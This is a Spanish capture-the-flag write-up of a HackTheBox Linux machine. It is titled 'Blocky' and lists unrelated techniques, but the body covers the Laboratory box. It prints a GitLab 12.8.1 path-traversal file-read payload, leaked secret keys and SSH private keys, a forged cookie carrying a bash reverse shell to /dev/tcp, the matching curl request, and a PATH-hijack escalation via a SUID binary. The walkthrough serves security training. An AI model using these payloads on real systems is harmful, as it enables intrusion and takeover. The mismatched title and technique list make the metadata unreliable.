---
title: Blocky | Linux
published: 2025-09-14
image: "./logo.png"
tags: [Easy, Linux, SSL Certificate Enumeration, Gitlab, Abusing gitlab-rails console, Information Leakage, Abusing SUID Binary, PATH Hijacking, eWPT, eWPTXv2, OSWE, OSCP]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- WordPress Enumeration
- Information Leakage
- Analyzing a jar file - JD-Gui + SSH Access
- Abusing Sudoers Privilege [Privilege Escalation]

### Preparación

- eJPT

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash wrap=false
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.216 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.10.216`      | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```txt wrap=false
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```bash wrap=false
nmap -sVC -p22,80,443 10.10.10.216 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.10.216`      | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```txt wrap=false
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como podemos ver en el puerto **443** nos reporta los dominios `laboratory.htb` y `git.laboratory.htb`, vamos a añadirlos al `/etc/hosts` y ver que hay en ellos.

### laboratory.htb

![laboratory.htb](./1.png)

### git.laboratory.htb

![git.laboratory.htb](./2.png)

De primeras en el primero no podemos ver nada, pero en el segundo podemos crear una cuenta:

![Gitlab Home](./3.png)

Si nos vamos a la ruta `/help` veremos la versión que es: `GitLab Community Edition 12.8.1`. Vamos a buscar algún exploit para ella.

## Explotación

### Arbitrary file read

Encontramos este reporte en [HackerOne](https://hackerone.com/reports/827052) que nos habla de un `Arbitrary file read` y después un `Remote commmand execution`. Deberemos seguir los siguientes pasos para conseguirlo:

- Crear 2 proyectos.
- Añadir una **issue** con la siguiente descripción:

```md wrap=false
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

- Mover la **issue** al segundo proyecto, y con eso el archivo ya debería haber sido copiado.

![Archivo conseguido](./4.png)

```txt title="/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
```

### Remote command execution

Ahora el reporte nos dice que para conseguir `RCE` deberemos filtrar `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`:

```txt  title="/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml"
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    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
    -----END RSA PRIVATE KEY-----
```

Para la siguiente parte necesitaremos tener `gitlab` en local. Para ello usuaremos el siguiente comando para instalarlo con **docker**:

```bash
sudo docker run gitlab/gitlab-ee:12.8.1-ee.0
```

Esto nos ejecutará el docker de gitlab de la versión vulnerable. Ahora para conectarnos, ejecutaremos la siguiente secuencia de comandos:

```bash wrap=false
❯ docker ps
CONTAINER ID   IMAGE                          COMMAND             CREATED          STATUS                    PORTS                     NAMES
7fca3a44b67b   gitlab/gitlab-ee:12.8.1-ee.0   "/assets/wrapper"   16 minutes ago   Up 16 minutes (healthy)   22/tcp, 80/tcp, 443/tcp   epic_williamson
❯  docker exec -it 7fca3a44b67b bash
root@7fca3a44b67b:/# whoami
root
```

De esta manera nos conectaremos con una shell sobre nuestro contenendor. Ahora cambiaremos el `secret_key_base` de nuestra máquina por el de la máquina víctima. Ahora simplemente seguiremos los pasos del exploit. Deberemos ejecutar la siguiente secuencia de comandos dentro de `gitlab-rails console`:

```bash
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

Una vez hecho deberemos hacer la siguiente petición:

```bash
curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kicyNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjgvNDQzIDA+JjEnYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--1f46f9c35e78c1d58646b9cff39b03232269f732"
```

```bash
❯ sudo nc -lvnp 443
[sudo] contraseña para zelpro: 
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.216] 44792
bash: cannot set terminal process group (285): Inappropriate ioctl for device
bash: no job control in this shell
git@git:~/gitlab-workhorse$ whoami
git
git@git:~/gitlab-workhorse$ hostname -I
172.17.0.2 
```

## Escalada de privilegios

Estamos dentro de un `contenedor`, se me ocurre darnos privilegio de **administrador** en gitlab para ver si hay algún repositorio más:

```bash
git@git:~/gitlab-workhorse$ gitlab-rails console -e production
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> user = User.find_by(email: 'zelpro@laboratory.htb')
=> #<User id:5 @zelpro>
irb(main):002:0> user.admin = true
=> true
irb(main):003:0> user.save!
=> true
```
![Confidential project](./5.png)

### dexter

En el encontramos un `id_rsa` de lo que parece el usuario `dexter`:

```txt wrap=false
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsZfDj3ASdb5YS3MwjsD8+5JvnelUs+yI27VuDD7P21odSfNUgCCt
oSE+v8sPNaB/xF0CVqQHtnhnWe6ndxXWHwb34UTodq6g2nOlvtOQ9ITxSevDScM/ctI6h4
2dFBhs+8cW9uSxOwlFR4b70E+tv3BM3WoWgwpXvguP2uZF4SUNWK/8ds9TxYW6C1WkAC8Z
25M7HtLXf1WuXU/2jnw29bzgzO4pJPvMHUxXVwN839jATgQlNp59uQDBUicXewmp/5JSLr
OPQSkDrEYAnJMB4f9RNdybC6EvmXsgS9fo4LGyhSAuFtT1OjqyOY1uwLGWpL4jcDxKifuC
MPLf5gpSQHvw0fq6/hF4SpqM4iXDGY7p52we0Kek3hP0DqQtEvuxCa7wpn3I1tKsNmagnX
dqB3kIq5aEbGSESbYTAUvh45gw2gk0l+3TsOzWVowsaJq5kCyDm4x0fg8BfcPkkKfii9Kn
NKsndXIH0rg0QllPjAC/ZGhsjWSRG49rPyofXYrvAAAFiDm4CIY5uAiGAAAAB3NzaC1yc2
EAAAGBALGXw49wEnW+WEtzMI7A/PuSb53pVLPsiNu1bgw+z9taHUnzVIAgraEhPr/LDzWg
f8RdAlakB7Z4Z1nup3cV1h8G9+FE6HauoNpzpb7TkPSE8Unrw0nDP3LSOoeNnRQYbPvHFv
bksTsJRUeG+9BPrb9wTN1qFoMKV74Lj9rmReElDViv/HbPU8WFugtVpAAvGduTOx7S139V
rl1P9o58NvW84MzuKST7zB1MV1cDfN/YwE4EJTaefbkAwVInF3sJqf+SUi6zj0EpA6xGAJ
yTAeH/UTXcmwuhL5l7IEvX6OCxsoUgLhbU9To6sjmNbsCxlqS+I3A8Son7gjDy3+YKUkB7
8NH6uv4ReEqajOIlwxmO6edsHtCnpN4T9A6kLRL7sQmu8KZ9yNbSrDZmoJ13agd5CKuWhG
xkhEm2EwFL4eOYMNoJNJft07Ds1laMLGiauZAsg5uMdH4PAX3D5JCn4ovSpzSrJ3VyB9K4
NEJZT4wAv2RobI1kkRuPaz8qH12K7wAAAAMBAAEAAAGAH5SDPBCL19A/VztmmRwMYJgLrS
L+4vfe5mL+7MKGp9UAfFP+5MHq3kpRJD3xuHGQBtUbQ1jr3jDPABkGQpDpgJ72mWJtjB1F
kVMbWDG7ByBU3/ZCxe0obTyhF9XA5v/o8WTX2pOUSJE/dpa0VLi2huJraLwiwK6oJ61aqW
xlZMH3+5tf46i+ltNO4BEclsPJb1hhHPwVQhl0Zjd/+ppwE4bA2vBG9MKp61PV/C0smYmr
uLPYAjxw0uMlfXxiGoj/G8+iAxo2HbKSW9s4w3pFxblgKHMXXzMsNBgePqMz6Xj9izZqJP
jcnzsJOngAeFEB/FW8gCOeCp2FmP4oL08+SknvEUPjWM+Wl/Du0t6Jj8s9yqNfpqLLbJ+h
1gQdZxxHeSlTCuqnat4khVUJ8zZlBz7B9xBE7eItdAVmGcrM9ztz9DsrLVTBLzIjfr29my
7icbK30MnPBbFKg82AVDPdzl6acrKMnV0JTm19JnDrvWZD924rxpFCXDDcfAWgDr2hAAAA
wCivUUYt2V62L6PexreXojzD6aZMm2qZk6e3i2pGJr3sL49C2qNOY9fzDjCOyNd8S5fA14
9uNAEMtgMdxYrZZAu8ymwV9dXfI6x7V8s+8FCOiU2+axL+PBSEpsKEzlK37+iZ3D1XgYgM
4OYqq39p4wi8rkEaNVuJKYFo8FTHWVcKs3Z/y0NVGhPeaaQw3cAHjUv//K0duKA/m/hW8T
WVAs1IA5kND4sDrNOybRWhPhzLonJKhceVveoDsnunSw/vLgAAAMEA5+gJm0gypock/zbc
hjTa+Eb/TA7be7s2Ep2DmsTXpKgalkXhxdSvwiWSYk+PHj0ZO9BPEx9oQGW01EFhs1/pqK
vUOZ07cZPMI6L1pXHAUyH3nyw56jUj2A3ewGOd3QoYDWS+MMSjdSgiHgYhO09xX4LHf+wc
N2l+RkOEv7ZbOQedBxb+4Zhw+sgwIFVdLTblQd+JL4HIkNZyNXv0zOnMwE5jMiEbJFdhXg
LOCTp45CWs7aLIwkxBPN4SIwfcGfuXAAAAwQDECykadz2tSfU0Vt7ge49Xv3vUYXTTMT7p
7a8ryuqlafYIr72iV/ir4zS4VFjLw5A6Ul/xYrCud0OIGt0El5HmlKPW/kf1KeePfsHQHS
JP4CYgVRuNmqhmkPJXp68UV3djhA2M7T5j31xfQE9nEbEYsyRELOOzTwnrTy/F74dpk/pq
XCVyJn9QMEbE4fdpKGVF+MS/CkfE+JaNH9KOLvMrlw0bx3At681vxUS/VeISQyoQGLw/fu
uJvh4tAHnotmkAAAAPcm9vdEBsYWJvcmF0b3J5AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

Y podríamos entrar:

```bash wrap=false title="Conexión a la máquina víctima"
❯ ssh -i id_rsa dexter@10.10.10.216
The authenticity of host '10.10.10.216 (10.10.10.216)' can't be established.
ED25519 key fingerprint is SHA256:c2Av7TZmXzWQlFQEncuNK4MKeuu4bJutYUCRc2yq6LM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.216' (ED25519) to the list of known hosts.
dexter@laboratory:~$ whoami
dexter
```

### root

Si buscamos por archivos con privilegios `SUID` encontramos lo siguiente:

```bash wrap=false
dexter@laboratory:~$ find / -perm -4000 2>/dev/null | grep -v snap
/usr/local/bin/docker-security
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/at
/usr/bin/umount
/usr/bin/chsh
/usr/bin/mount
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
```

```bash wrap=false title="/usr/local/bin/docker-security"
dexter@laboratory:~$ file /usr/local/bin/docker-security
/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped
dexter@laboratory:~$ ltrace /usr/local/bin/docker-security
setuid(0)                                                                                                         = -1
setgid(0)                                                                                                         = -1
system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                            = 256
system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                            = 256
+++ exited (status 0) +++
```

En este punto podríamos intentar un `PATH Hijacking` debido a que usa `chmod` de manera **relativa**:

```bash title="/tmp/chmod"
#!/bin/bash

/bin/bash
```

```
dexter@laboratory:~$ cd /tmp
dexter@laboratory:/tmp$ nano chmod
dexter@laboratory:/tmp$ chmod +x chmod 
dexter@laboratory:/tmp$ export PATH=/tmp:$PATH
dexter@laboratory:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin

dexter@laboratory:/tmp$ /usr/local/bin/docker-security
# whoami
root
# cat /root/root.txt
dca69a81bf842dc301038c61ad233ecf
root@laboratory:/tmp# cat /home/dexter/user.txt 
2d2092e2aed65f53f6ce8c0859f83d4e
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/298)

---